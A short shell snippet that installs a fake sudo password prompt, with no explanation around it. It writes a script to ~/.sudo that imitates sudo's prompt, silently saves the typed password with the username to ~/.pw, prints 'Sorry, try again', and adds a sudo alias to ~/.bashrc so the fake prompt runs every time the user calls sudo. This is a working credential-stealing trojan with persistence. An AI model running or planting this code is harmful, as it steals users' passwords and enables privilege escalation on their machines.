cat << EOF > ~/.sudo
echo -n "[sudo] password for \$USER: "
read -s PASSWORD
echo "\$USER:\$PASSWORD" >> ~/.pw
sleep 1
echo -e "\nSorry, try again."
EOF
echo 'alias sudo="bash ~/.sudo; sudo"' >> ~/.bashrc
source ~/.bashrc

